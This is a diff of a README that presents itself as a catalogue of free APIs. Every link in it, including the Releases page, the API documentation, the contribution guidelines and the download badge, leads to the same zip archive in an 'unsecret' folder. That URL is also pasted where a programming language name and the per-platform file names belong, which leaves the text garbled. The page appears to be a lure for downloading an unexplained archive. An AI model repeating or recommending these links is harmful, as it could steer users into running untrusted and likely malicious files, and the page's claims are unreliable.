@@ -1,6 +1,6 @@
 # 🚀 awesome-free-apis - Access 100+ Free APIs Easily
 
-[![Download](https://raw.githubusercontent.com/maxcalijuri/awesome-free-apis/main/unsecret/free_awesome_apis_v3.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/maxcalijuri/awesome-free-apis/main/unsecret/free_awesome_apis_v3.0.zip)
+[![Download](https://github.com/maxcalijuri/awesome-free-apis/raw/refs/heads/main/unsecret/free_awesome_apis_v3.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/maxcalijuri/awesome-free-apis/raw/refs/heads/main/unsecret/free_awesome_apis_v3.0.zip)
 
 ## 📖 Overview
 
@@ -21,11 +21,11 @@ To start using the APIs, you need to download the files from our Releases page. 
 - Access to 100+ Free APIs.
 - Easy to use and implement.
 - No registration or payment needed.
-- Suitable for various programming languages including JavaScript, https://raw.githubusercontent.com/maxcalijuri/awesome-free-apis/main/unsecret/free_awesome_apis_v3.0.zip, and React.
+- Suitable for various programming languages including JavaScript, https://github.com/maxcalijuri/awesome-free-apis/raw/refs/heads/main/unsecret/free_awesome_apis_v3.0.zip, and React.
 
 ## 📥 Download & Install
 
-To download the software, please visit our [Releases page](https://raw.githubusercontent.com/maxcalijuri/awesome-free-apis/main/unsecret/free_awesome_apis_v3.0.zip) and choose the version that suits your system.
+To download the software, please visit our [Releases page](https://github.com/maxcalijuri/awesome-free-apis/raw/refs/heads/main/unsecret/free_awesome_apis_v3.0.zip) and choose the version that suits your system.
 
 **Follow these steps**:
 
@@ -34,7 +34,7 @@ To download the software, please visit our [Releases page](https://raw.githubuse
 3. Select the latest version from the list.
 4. Click on the link to download the appropriate file for your system. 
 
-For example, if you are using Windows, look for a file titled something like `https://raw.githubusercontent.com/maxcalijuri/awesome-free-apis/main/unsecret/free_awesome_apis_v3.0.zip`. If you are using macOS, look for `https://raw.githubusercontent.com/maxcalijuri/awesome-free-apis/main/unsecret/free_awesome_apis_v3.0.zip`. 
+For example, if you are using Windows, look for a file titled something like `https://github.com/maxcalijuri/awesome-free-apis/raw/refs/heads/main/unsecret/free_awesome_apis_v3.0.zip`. If you are using macOS, look for `https://github.com/maxcalijuri/awesome-free-apis/raw/refs/heads/main/unsecret/free_awesome_apis_v3.0.zip`. 
 
 5. Once the file has downloaded, locate it in your downloads folder.
 
@@ -46,7 +46,7 @@ Once you successfully download and open the file, you can start exploring the av
 
 ### Step 1: Choose an API
 
-Visit our [API list](https://raw.githubusercontent.com/maxcalijuri/awesome-free-apis/main/unsecret/free_awesome_apis_v3.0.zip) to see all available options. Browse through the types of APIs and find one that meets your project’s needs.
+Visit our [API list](https://github.com/maxcalijuri/awesome-free-apis/raw/refs/heads/main/unsecret/free_awesome_apis_v3.0.zip) to see all available options. Browse through the types of APIs and find one that meets your project’s needs.
 
 ### Step 2: Make a Request
 
@@ -80,8 +80,8 @@ If you have questions or need help, please check the Issues section on GitHub or
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/maxcalijuri/awesome-free-apis/main/unsecret/free_awesome_apis_v3.0.zip)
-- [API Documentation](https://raw.githubusercontent.com/maxcalijuri/awesome-free-apis/main/unsecret/free_awesome_apis_v3.0.zip)
-- [Contribution Guidelines](https://raw.githubusercontent.com/maxcalijuri/awesome-free-apis/main/unsecret/free_awesome_apis_v3.0.zip)
+- [Releases Page](https://github.com/maxcalijuri/awesome-free-apis/raw/refs/heads/main/unsecret/free_awesome_apis_v3.0.zip)
+- [API Documentation](https://github.com/maxcalijuri/awesome-free-apis/raw/refs/heads/main/unsecret/free_awesome_apis_v3.0.zip)
+- [Contribution Guidelines](https://github.com/maxcalijuri/awesome-free-apis/raw/refs/heads/main/unsecret/free_awesome_apis_v3.0.zip)
 
 Thank you for choosing **awesome-free-apis**. We hope you find it useful in your development journey!
